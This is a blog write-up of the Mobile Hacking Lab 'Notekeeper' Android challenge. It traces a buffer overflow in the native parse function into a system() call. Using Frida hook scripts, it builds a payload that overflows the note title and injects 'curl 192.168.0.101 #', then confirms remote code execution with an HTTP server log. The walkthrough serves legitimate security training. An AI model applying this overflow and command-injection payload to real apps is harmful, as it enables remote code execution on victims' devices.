---
layout: post
title: Notekeeper - Mobile Hacking Lab
color: rgb(51,122,183)
tags: [Mobile Hacking lab, Android Security]
comments: true
share: false
excerpt_separator: <!--more-->
---

The [Notekeeper](https://www.mobilehackinglab.com/course/lab-notekeeper) lab challenges us to explore a Buffer Overflow vulnerability in a library utilized by the application in order to achieve Remote Code Execution (RCE).<!--more--> In this article, we will analyze the application to understand which code is vulnerable and how we can attain RCE.

### Introduction

The initial step involves opening the application. Upon opening, we are presented with a button that allows us to add a note after entering a title and its content. Afterward, the note is added, and a list of all notes is displayed. Let's delve into the application's code.

### Static Analysis

Upon examining the `MainActivity` using JADX, there doesn't seem to be anything exceptional except for the loading of a library called `notekeeper`, where the `parse` method is called with the note's title as a parameter whenever a note is created.

```java
package com.mobilehackinglab.notekeeper;

...
import kotlin.jvm.internal.Intrinsics;

/* compiled from: MainActivity.kt */
@Metadata(m24d1 = {"\u0000>\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010!\n\u0002\u0018\u0002\n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u000e\n\u0002\b\u0004\u0018\u0000 \u00162\u00020\u0001:\u0001\u0016B\u0005¢\u0006\u0002\u0010\u0002J\u0012\u0010\u000e\u001a\u00020\u000f2\b\u0010\u0010\u001a\u0004\u0018\u00010\u0011H\u0014J\u0011\u0010\u0012\u001a\u00020\u00132\u0006\u0010\u0014\u001a\u00020\u0013H\u0086 J\u0006\u0010\u0015\u001a\u00020\u000fR\u000e\u0010\u0003\u001a\u00020\u0004X\u0082.¢\u0006\u0002\n\u0000R\u0017\u0010\u0005\u001a\b\u0012\u0004\u0012\u00020\u00070\u0006¢\u0006\b\n\u0000\u001a\u0004\b\b\u0010\tR\u000e\u0010\n\u001a\u00020\u000bX\u0082.¢\u0006\u0002\n\u0000R\u000e\u0010\f\u001a\u00020\rX\u0082.¢\u0006\u0002\n\u0000¨\u0006\u0017"}, m23d2 = {"Lcom/mobilehackinglab/notekeeper/MainActivity;", "Landroidx/appcompat/app/AppCompatActivity;", "()V", "fab", "Lcom/google/android/material/floatingactionbutton/FloatingActionButton;", "notes", "", "Lcom/mobilehackinglab/notekeeper/note_data;", "getNotes", "()Ljava/util/List;", "notes_adp", "Lcom/mobilehackinglab/notekeeper/Note_Adapter;", "rv", "Landroidx/recyclerview/widget/RecyclerView;", "onCreate", "", "savedInstanceState", "Landroid/os/Bundle;", "parse", "", "Title", "showDialogue", "Companion", "app_debug"}, m22k = 1, m21mv = {1, 9, 0}, m19xi = ConstraintLayout.LayoutParams.Table.LAYOUT_CONSTRAINT_VERTICAL_CHAINSTYLE)
/* loaded from: classes3.dex */
public final class MainActivity extends AppCompatActivity {
    public static final Companion Companion = new Companion(null);
    private FloatingActionButton fab;
    private final List<note_data> notes = new ArrayList();
    private Note_Adapter notes_adp;

    /* renamed from: rv */
    private RecyclerView f175rv;

    public final native String parse(String str);

    public final List<note_data> getNotes() {
        return this.notes;
    }

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(C0893R.layout.activity_main);
        View findViewById = findViewById(C0893R.C0896id.recyclerView);
        Intrinsics.checkNotNullExpressionValue(findViewById, "findViewById(...)");
        RecyclerView recyclerView = (RecyclerView) findViewById;
        this.f175rv = recyclerView;
        FloatingActionButton floatingActionButton = null;
        if (recyclerView == null) {
            Intrinsics.throwUninitializedPropertyAccessException("rv");
            recyclerView = null;
        }
        recyclerView.setLayoutManager(new LinearLayoutManager(this));
        this.notes_adp = new Note_Adapter(this.notes);
        RecyclerView recyclerView2 = this.f175rv;
        if (recyclerView2 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("rv");
            recyclerView2 = null;
        }
        Note_Adapter note_Adapter = this.notes_adp;
        if (note_Adapter == null) {
            Intrinsics.throwUninitializedPropertyAccessException("notes_adp");
            note_Adapter = null;
        }
        recyclerView2.setAdapter(note_Adapter);
        View findViewById2 = findViewById(C0893R.C0896id.floatingActionButton);
        Intrinsics.checkNotNullExpressionValue(findViewById2, "findViewById(...)");
        this.fab = (FloatingActionButton) findViewById2;
        Toast.makeText(this, "Visit for more @ mobilehackinglab.com", 1).show();
        FloatingActionButton floatingActionButton2 = this.fab;
        if (floatingActionButton2 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("fab");
        } else {
            floatingActionButton = floatingActionButton2;
        }
        floatingActionButton.setOnClickListener(new View.OnClickListener() { // from class: com.mobilehackinglab.notekeeper.MainActivity$$ExternalSyntheticLambda0
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                MainActivity.onCreate$lambda$0(MainActivity.this, view);
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void onCreate$lambda$0(MainActivity this$0, View it) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        this$0.showDialogue();
    }

    public final void showDialogue() {
        final Dialog dialog = new Dialog(this);
        dialog.requestWindowFeature(1);
        dialog.setCancelable(false);
        dialog.setContentView(C0893R.layout.dialogue_layout);
        final EditText ed_content = (EditText) dialog.findViewById(C0893R.C0896id.ed_note);
        final EditText ed_title = (EditText) dialog.findViewById(C0893R.C0896id.ed_title);
        Button submit = (Button) dialog.findViewById(C0893R.C0896id.Add_btn);
        submit.setOnClickListener(new View.OnClickListener() { // from class: com.mobilehackinglab.notekeeper.MainActivity$$ExternalSyntheticLambda1
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                MainActivity.showDialogue$lambda$1(ed_title, ed_content, this, dialog, view);
            }
        });
        dialog.show();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void showDialogue$lambda$1(EditText $ed_title, EditText $ed_content, MainActivity this$0, Dialog dialog, View it) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        Intrinsics.checkNotNullParameter(dialog, "$dialog");
        String title_ = $ed_title.getText().toString();
        String note_con = $ed_content.getText().toString();
        if (title_.length() > 0) {
            if (note_con.length() > 0) {
                String cap_title = this$0.parse(title_);
                note_data dataElement = new note_data(cap_title, note_con, "Number of characters : " + note_con.length());
                this$0.notes.add(dataElement);
                Note_Adapter note_Adapter = this$0.notes_adp;
                if (note_Adapter == null) {
                    Intrinsics.throwUninitializedPropertyAccessException("notes_adp");
                    note_Adapter = null;
                }
                note_Adapter.notifyDataSetChanged();
                dialog.dismiss();
                return;
            }
        }
        Toast.makeText(this$0, "Don't leave the title or note field empty", 0).show();
    }

    /* compiled from: MainActivity.kt */
    @Metadata(m24d1 = {"\u0000\f\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0002\b\u0086\u0003\u0018\u00002\u00020\u0001B\u0007\b\u0002¢\u0006\u0002\u0010\u0002¨\u0006\u0003"}, m23d2 = {"Lcom/mobilehackinglab/notekeeper/MainActivity$Companion;", "", "()V", "app_debug"}, m22k = 1, m21mv = {1, 9, 0}, m19xi = ConstraintLayout.LayoutParams.Table.LAYOUT_CONSTRAINT_VERTICAL_CHAINSTYLE)
    /* loaded from: classes3.dex */
    public static final class Companion {
        public /* synthetic */ Companion(DefaultConstructorMarker defaultConstructorMarker) {
            this();
        }

        private Companion() {
        }
    }

    static {
        System.loadLibrary("notekeeper");
    }
}
```

Upon inspecting the `libnotekeeper.so` library in Ghidra, we find the `Java_com_mobilehackinglab_notekeeper_MainActivity_parse` function, which takes the note's title as a parameter.

The location of the libray inside the apk is `/lib/<your_architecture>/libnotekeeper.so`.

```c

undefined8
Java_com_mobilehackinglab_notekeeper_MainActivity_parse
          (_JNIEnv *param_1,undefined8 param_2,_jstring *param_3)

{
  int local_2a8;
  char local_2a4 [100];
  char acStack_240 [500];
  int local_4c;
  ushort *local_48;
  _jstring *local_40;
  undefined8 local_38;
  _JNIEnv *local_30;
  undefined8 local_28;
  
  local_40 = param_3;
  local_38 = param_2;
  local_30 = param_1;
  local_48 = (ushort *)_JNIEnv::GetStringChars(param_1,param_3,(uchar *)0x0);
  local_4c = _JNIEnv::GetStringLength(local_30,local_40);
  memcpy(acStack_240,"Log \"Note added at $(date)\"",500);
  if (local_48 == (ushort *)0x0) {
    local_28 = 0;
  }
  else {
    local_2a4[0] = FUN_00100bf4(*local_48 & 0xff);
    for (local_2a8 = 1; local_2a8 < local_4c; local_2a8 = local_2a8 + 1) {
      local_2a4[local_2a8] = (char)local_48[local_2a8];
    }
    system(acStack_240);
    local_2a4[local_2a8] = '\0';
    local_28 = _JNIEnv::NewStringUTF(local_30,local_2a4);
  }
  return local_28;
}
```

Upon closer examination of the code, we can see that the value `Log \"Note added at $(date)\` is passed to the variable `acStack_240` through the `memcpy` function, which is later used as a parameter for the `system` function to execute commands on the system.

So our objective is to modify the value of the variable `acStack_240` to achieve remote code execution on the victim's mobile device.

First, let's create a Frida script to hook into `libc` and observe the parameters passed to the `system` function.

```js
// hook.js
 function intercept_nativeCall(lib,fun){
    let addr = Module.findExportByName(lib,fun);
    Interceptor.attach(addr, {
      onEnter: function (args) {
        console.log(fun," -> Args: ", args[0].readUtf8String())
      }
    })
  }

intercept_nativeCall("libc.so", "system")
```

Running the application with Frida using our script:
```bash 
frida -Uf com.mobilehackinglab.notekeeper -l hook.js
```

Gives this output: 
```
system  -> Args:  Log "Note added at $(date)"
```


Let's look into the code again, this time with a closer eye to try to understand the buffer overflow vulnerability. When examining this loop:
```c
for (local_2a8 = 1; local_2a8 < local_4c; local_2a8 = local_2a8 + 1) {
      local_2a4[local_2a8] = (char)local_48[local_2a8];
    }
```

We can see that the content of the note's title is being written into the variable `local_2a4` character by character. However, there is a problem here: this variable has a size of only 100 characters.

From this observation, we can identify a buffer overflow vulnerability because we can write more than 100 characters into this variable.

So, let's attempt to override the content of the stack in order to manipulate the value of `acStack_240` to achieve Remote Code Execution.

Let's create a Frida script that generates a string of 100 elements and then observe if, on the 101st position, we start to override the `acStack_240` value.

Let's update our Frida script to look like this:
```js
// hook.js
function intercept_nativeCall(lib,fun){
    let addr = Module.findExportByName(lib,fun);
    Interceptor.attach(addr, {
      onEnter: function (args) {
        console.log(fun," -> Args: ", args[0].readUtf8String())
      }
    })
  }

intercept_nativeCall("libc.so", "system")


Java.perform(function() {

    let MainActivity = Java.use("com.mobilehackinglab.notekeeper.MainActivity");
    MainActivity["parse"].implementation = function (title) {


        title = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAb"

        console.log(`Native parse is called: str=${title}`);
        this["parse"](title);
        return;
    };
});
```

### Explointg the application

With this code, when we add a note, the 101st element of the string is the character 'b', and in the output of the script, we see that we successfully override the stack and can control the value passed into the system function.

Output of the running app with Frida after adding a note:
```
 Native parse is called: str=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAb
system  -> Args:  bog "Note added at $(date)"
```

Now, we just need to adjust our payload to achieve remote code execution.

```js
// hook.js
function intercept_nativeCall(lib,fun){
    let addr = Module.findExportByName(lib,fun);
    Interceptor.attach(addr, {
      onEnter: function (args) {
        console.log(fun," -> Args: ", args[0].readUtf8String())
      }
    })
  }

intercept_nativeCall("libc.so", "system")


Java.perform(function() {

    let MainActivity = Java.use("com.mobilehackinglab.notekeeper.MainActivity");
    MainActivity["parse"].implementation = function (title) {


        var command = "curl 192.168.0.101 #";
        title = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + command

        console.log(`Native parse is called: str=${title}`);
        this["parse"](title);
        return;
    };
});
```

With this payload, we just need to start an HTTP server with Python to confirm the RCE.
```bash
#On your host
python -m http.server 80
```

Then, start the app with:

```bash
frida -Uf com.mobilehackinglab.notekeeper -l hook.js
```

Afterward, create a note. When you create the note, you will observe interaction on your HTTP server, confirming the RCE.

```
::ffff:192.168.0.103 - - [09/Feb/2024 19:34:01] "GET / HTTP/1.1" 200 -
```


### Conclusion

This lab illustrates how a buffer overflow vulnerability in a native library within our application can lead an attacker to attain Remote Code Execution. Visit the lab at [MobileHackingLab - Notekeeper](https://www.mobilehackinglab.com/course/lab-notekeeper) to embark on a journey of discovery and skill enhancement in mobile security.